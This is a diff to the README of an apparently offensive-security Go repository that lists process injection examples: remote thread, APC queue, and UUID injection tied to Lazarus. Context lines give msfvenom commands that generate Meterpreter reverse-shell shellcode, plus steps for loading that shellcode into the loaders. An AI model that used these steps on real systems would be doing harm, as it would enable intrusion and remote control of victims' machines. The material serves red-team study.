@@ -7,9 +7,9 @@ Process injection techniques written in Go.
 * [Classic virtual alloc](examples/x64/valloc/valloc.go)
 * [Hook detection](examples/x64/detect-hooks/detect-hooks.go)
 * [Heap](examples/x64/heap/heap.go)
-* [Remote Thread Injection](examples/x64/remote-thread/remote-thread.go)
+* [Remote Thread Injection](examples/x64/remote-thread/remote_thread.go)
 * [APC Queue Code Injection](examples/x64/queue-user-apc/queue.go)
-* [UUID Injection](examples/x64/uuid/uuid.go)
+* [UUID Injection - Used by Lazarus 2021](examples/x64/uuid/uuid.go)
 
 ## Usage
 
@@ -25,7 +25,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.
 msfvenom -p windows/x64/meterpreter_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
 ```
 
-Place payload string from above command within one of the example .go files replacing the content of the `payload` variable. If using uuid example, use [shellcode-to-uuids](examples/shellcode-to-uuids.go) to convert to payload.
+Place payload string from above command within one of the example .go files replacing the content of the `payload` variable. If using uuid example, use [shellcode-to-uuids](helpers/shellcode-to-uuids.go) to convert to payload.
 
 Start listener:
 
@@ -51,12 +51,13 @@ go build example.go
 
 ## References
 
-* https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
-* https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
+* https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/
+* https://github.com/Adepts-Of-0xCC/VBA-macro-experiments/blob/main/EDRHookDetector.vba
 * https://github.com/brimstone/go-shellcode
 * https://github.com/sysdream/hershell
 * https://github.com/yoda66/MalwareDevTalk
+* https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
+* https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
 * https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa
-* https://github.com/Adepts-Of-0xCC/VBA-macro-experiments/blob/main/EDRHookDetector.vba
+* https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
 * https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
-* https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/
